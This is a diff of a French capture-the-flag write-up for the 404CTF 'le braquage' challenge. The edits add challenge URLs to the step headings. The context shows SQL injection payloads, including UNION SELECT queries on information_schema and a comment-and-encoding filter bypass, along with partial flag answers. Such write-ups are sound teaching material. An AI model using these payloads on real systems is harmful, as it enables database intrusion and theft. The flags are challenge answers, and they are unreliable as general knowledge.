@@ -25,7 +25,7 @@
 
 On a donc pour le moment `404CTF{Nom},404CTF{Prénom},404CTF{21 rue des kiwis},404CTF{Date},404CTF{Heure},404CTF{0145769456},404CTF{Mdp}` et Code = OpérationGorfou
 
-2. Sur 
+2. Sur https://le-braquage.404ctf.fr/scripts/page2.php:
 - Identifiant: `' OR ''='' UNION SELECT table_name, column_name FROM information_schema.columns WHERE ''='`
 
 ```nushell
@@ -78,7 +78,7 @@ On a donc pour le moment `404CTF{Nom},404CTF{Prénom},404CTF{21 rue des kiwis},4
 
 On a donc pour le moment `404CTF{Vereux},404CTF{UnGorfou},404CTF{21 rue des kiwis},404CTF{Date},404CTF{Heure},404CTF{0145769456},404CTF{Mdp}`
 
-3. Page :
+3. Sur https://le-braquage.404ctf.fr/scripts/page3.php:
 
 - Code: `OpérationGorfou`
 ```nushell
@@ -90,7 +90,7 @@ On a donc pour le moment `404CTF{Vereux},404CTF{UnGorfou},404CTF{21 rue des kiwi
 ```
 On a donc pour le moment `404CTF{Vereux},404CTF{UnGorfou},404CTF{21 rue des kiwis},404CTF{2022-07-14},404CTF{01hDuMatin},404CTF{0145769456},404CTF{Mdp}`
 
-4. Page: 
+4. Sur https://le-braquage.404ctf.fr/scripts/page3.php:
 > Doc: https://portswigger.net/support/sql-injection-bypassing-common-filters
 
 - Code: `'OR''=''UNION/**/S%45lect/**/table_name,column_name,1/**/FROM/**/information_schema.columns/**/WHERE''='`
